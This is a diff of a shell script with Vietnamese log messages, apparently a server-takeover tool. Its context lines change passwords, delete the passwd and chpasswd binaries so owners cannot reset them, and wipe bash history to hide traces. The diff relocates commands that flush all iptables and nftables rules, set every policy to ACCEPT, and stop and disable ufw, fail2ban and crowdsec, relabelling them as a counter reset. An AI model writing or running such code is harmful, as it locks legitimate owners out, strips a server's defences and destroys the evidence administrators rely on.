@@ -20,11 +20,7 @@ sysctl -w fs.file-max=2097152 &>/dev/null
 ulimit -n 999999 2>/dev/null
 echo "* soft nofile 999999" >> /etc/security/limits.conf
 echo "* hard nofile 999999" >> /etc/security/limits.conf
-iptables -F && iptables -X && iptables -t nat -F && iptables -t mangle -F
-iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACCEPT
-nft flush ruleset &>/dev/null
-systemctl stop ufw fail2ban crowdsec &>/dev/null
-systemctl disable ufw fail2ban crowdsec &>/dev/null
+
 
 
 echo "[+] Bắt đầu thay passwd..."
@@ -48,6 +44,14 @@ rm -f /usr/bin/chpasswd /bin/chpasswd /usr/sbin/chpasswd
 rm -f /usr/bin/passwd /bin/passwd
 echo "[+] Đã chặn thay passwd"
 
+echo "[+] Reset counter iptables..."
+iptables -F && iptables -X && iptables -t nat -F && iptables -t mangle -F
+iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACCEPT
+nft flush ruleset &>/dev/null
+
+echo "[+] Tắt dịch vụ tường lửa..."
+systemctl stop ufw fail2ban crowdsec &>/dev/null
+systemctl disable ufw fail2ban crowdsec &>/dev/null
 
 echo "[!] Đang dọn dấu vết 100%..."
     history -c; echo "" > /root/.bash_history
